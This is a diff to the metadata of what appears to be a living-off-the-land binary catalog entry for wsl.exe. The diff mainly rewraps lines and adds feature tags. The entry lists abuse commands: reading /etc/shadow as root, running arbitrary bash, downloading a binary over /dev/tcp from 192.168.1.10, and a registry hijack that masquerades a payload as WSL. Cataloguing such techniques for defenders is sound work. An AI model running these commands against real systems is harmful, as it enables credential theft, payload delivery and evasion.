@@ -43,7 +43,10 @@ resource_profile:
 allowed-tools:
 - wsl
 parameters: []
-features: []
+features:
+- network-intensive
+- pipes-stdin
+- pipes-stdout
 execution:
   template: wsl
   sandbox: execFile
@@ -51,15 +54,23 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Executes calc.exe from wsl.exe (Performs execution of specified file, can be used to execute arbitrary Linux commands.)
+- description: Executes calc.exe from wsl.exe (Performs execution of specified file,
+    can be used to execute arbitrary Linux commands.)
   command: wsl.exe -e /mnt/c/Windows/System32/calc.exe
-- description: Cats /etc/shadow file as root (Performs execution of arbitrary Linux commands as root without need for password.)
+- description: Cats /etc/shadow file as root (Performs execution of arbitrary Linux
+    commands as root without need for password.)
   command: wsl.exe -u root -e cat /etc/shadow
-- description: Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`) (Performs execution of arbitrary Linux commands.)
+- description: Executes Linux command (for example via bash) as the default user (unless
+    stated otherwise using `-u <username>`) on the default WSL distro (unless stated
+    otherwise using `-d <distro name>`) (Performs execution of arbitrary Linux commands.)
   command: wsl.exe --exec bash -c "{CMD}"
 - description: Downloads file from 192.168.1.10 (Download file)
   command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
-- description: When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder. (Execute a payload as a child process of `bash.exe` while masquerading as WSL.)
+- description: When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`,
+    which contains a folder path (`c:\program files\wsl` by default). If the value
+    points to another folder containing a file named `wsl.exe`, it will be executed
+    instead of the legitimate `wsl.exe` in the program files folder. (Execute a payload
+    as a child process of `bash.exe` while masquerading as WSL.)
   command: wsl.exe
 references:
 - label: microsoft-recommended-block-rules
@@ -89,7 +100,6 @@ install:
   commands:
   - choco install wsl
 ---
-
 
 # wsl
 
